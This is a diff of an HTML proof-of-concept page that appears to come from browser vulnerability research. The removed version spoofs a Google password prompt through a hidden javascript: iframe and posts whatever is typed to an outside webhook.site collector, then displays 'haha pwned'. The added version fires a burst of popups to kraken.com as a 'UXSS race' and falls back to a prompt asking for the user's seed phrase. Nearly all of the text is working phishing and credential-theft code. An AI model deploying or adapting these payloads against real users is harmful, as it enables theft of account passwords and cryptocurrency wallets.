@@ -1,103 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spoofed Prompt PoC</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 20px;
-            font-family: Arial, sans-serif;
-            background: #f0f0f0;
-            text-align: center;
-        }
-        button {
-            display: inline-block;
-            padding: 15px 30px;
-            background: #ff4444;
-            color: white;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 50px;
-            border: none;
-        }
-        button:hover { background: #cc0000; }
-        #status {
-            margin-top: 20px;
-            color: #333;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .hidden {
-            display: none;
-        }
-    </style>
+  <title>PoC: Race UXSS via window open</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    button { padding: 10px 20px; font-size: 16px; }
+  </style>
 </head>
 <body>
-    <h2>Click to Trigger Spoofed Prompt</h2>
-    <button id="triggerBtn">Spoof Prompt</button>
-    <div id="status"></div>
-    <form id="hiddenForm" class="hidden" method="POST" action="https://webhook.site/a0e0c5fe-06e8-45e3-a9c0-de820eb2432d/submit">
-        <input type="text" id="passwordInput" name="password">
-    </form>
+  <h1>UXSS Race Test</h1>
+  <p>Click button below to launch 10 popups in a race attack.</p>
+  <button onclick="startRace()">Launch Attack x10</button>
 
-    <script>
-        document.getElementById('triggerBtn').onclick = () => {
-            // Step 1: Open a legit domain in a new window
-            const w = window.open('https://account.google.com/');
-            if (!w) {
-                document.getElementById('status').innerHTML = 'Popup blocked. Fallback not implemented.';
-                return;
-            }
-            // Step 2: Create hidden iframe and trigger prompt after 2s
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.src = 'javascript:(function(){var p=prompt("account.google.com says                                                                                                                                     Password:");if(p){document.write(\'<form method="POST" action="https://webhook.site/a0e0c5fe-06e8-45e3-a9c0-de820eb2432d/submit" id="iframeForm"><input type="hidden" name="password" value="\'+p+\'"><input type="submit"></form>\');document.getElementById("iframeForm").submit();}})()';
-                iframe.style.display = 'none';
-                document.body.appendChild(iframe);
+  <script>
+    function startOnce() {
+      let popup = window.open("https://www.kraken.com/");
+      if (!popup) {
+        prompt("Please insert your Seed Phrase");
+      }
+    }
 
-                // Step 3: Listen for form submission and update status
-                const hiddenForm = document.getElementById('hiddenForm');
-                hiddenForm.onsubmit = (e) => {
-                    e.preventDefault(); // Prevent actual submission
-                    const password = document.getElementById('passwordInput').value; // This won't work directly; see workaround below
-                    if (password) {
-                        document.getElementById('status').innerHTML = 'haha pwned<br>Password captured: ' + password;
-                    } else {
-                        document.getElementById('status').innerHTML = 'haha pwned<br>No password captured.';
-                    }
-                    // Clean up
-                    setTimeout(() => {
-                        document.body.removeChild(iframe);
-                        if (w && !w.closed) w.close();
-                    }, 2000);
-                };
-
-                // Workaround: Poll for iframe content change (since direct access is restricted)
-                const checkIframe = setInterval(() => {
-                    try {
-                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                        const iframeForm = iframeDoc.getElementById('iframeForm');
-                        if (iframeForm) {
-                            const pwd = iframeForm.querySelector('input[name="password"]').value;
-                            if (pwd) {
-                                document.getElementById('status').innerHTML = 'haha pwned<br>Password captured: ' + pwd;
-                                clearInterval(checkIframe);
-                                setTimeout(() => {
-                                    document.body.removeChild(iframe);
-                                    if (w && !w.closed) w.close();
-                                }, 2000);
-                            }
-                        }
-                    } catch (e) {
-                        // Cross-origin error; proceed with cleanup
-                        clearInterval(checkIframe);
-                    }
-                }, 0);
-            }, 2000);
-        };
-    </script>
+    function startRace() {
+      // Loop 10 times with a short pause
+      for (let i = 0; i < 10; i++) {
+        setTimeout(startOnce, i * 50);
+      }
+    }
+  </script>
 </body>
 </html>
